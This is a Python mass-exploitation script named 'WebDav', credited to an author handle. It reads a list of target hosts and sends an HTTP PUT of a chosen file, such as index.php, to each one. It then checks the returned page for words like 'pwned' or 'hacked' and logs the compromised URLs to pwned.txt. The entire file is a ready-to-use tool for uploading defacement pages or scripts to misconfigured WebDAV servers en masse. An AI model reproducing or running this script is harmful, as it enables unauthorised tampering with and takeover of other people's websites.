#!/usr/bin/python3
# coding: utf-8

import sys
import os

# Coding by KriptonWave
# Twitter: @KriptonWave1

os.system("clear||cls")

index = (r"""
 /$$      /$$           /$$       /$$$$$$$                            
| $$  /$ | $$          | $$      | $$__  $$                           
| $$ /$$$| $$  /$$$$$$ | $$$$$$$ | $$  \ $$  /$$$$$$  /$$    /$$      
| $$/$$ $$ $$ /$$__  $$| $$__  $$| $$  | $$ |____  $$|  $$  /$$/      
| $$$$_  $$$$| $$$$$$$$| $$  \ $$| $$  | $$  /$$$$$$$ \  $$/$$/       
| $$$/ \  $$$| $$_____/| $$  | $$| $$  | $$ /$$__  $$  \  $$$/        
| $$/   \  $$|  $$$$$$$| $$$$$$$/| $$$$$$$/|  $$$$$$$   \  $/         
|__/     \__/ \_______/|_______/ |_______/  \_______/    \_/  
							        Twitter: @KriptonWave1""")

save = open("pwned.txt","w")
logs = []
headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1'}

try:

    from colorama import Fore as F
    from colorama import *

except:
        print (index)
        print ("[!] Install: pip install colorama")
        exit()

try:
    import requests
except:
        print (index)
        print ("[!] Install: pip install requests")
        exit()


print (Style.BRIGHT + F.CYAN + index + F.RESET)


try:
	target = sys.argv[1]
	index = sys.argv[2]
	tcp  = open(sys.argv[2]).read()
  
	print (F.GREEN + "[+] Loading....." + F.RESET)
	print

except:
	print (F.WHITE + "Usage: " + sys.argv[0] + " list.txt" + " index.php")
	sys.exit()

with open(target,'r') as alvos:
     web = alvos.readlines()

     for pwn in web:
         pwn = ("http://" + pwn.rstrip("\n") + "/")
         owt = (index.rstrip('\n'))
         cwt = (pwn+owt)
         vtx = requests.get(cwt, headers=headers)
	    
         try:
              r = requests.request('put', cwt , data=tcp , headers={'Content-Type':'application/octet-stream'})
						          
         except:
                 pass
			  			 			 			 						
         if "pwned" in vtx.text or "Pwned" in vtx.text or "Hacked" in vtx.text or "hacked" in vtx.text or "Owned" in vtx.text or "owned" in vtx.text:
                  print (F.GREEN + "[+] Pwned: " + cwt + F.RESET) 
                  logs.append('\n'+cwt)
         else:
                print (F.RED + "[-] Fail: " + cwt + F.RESET)

save.writelines(logs)
save.close()





####
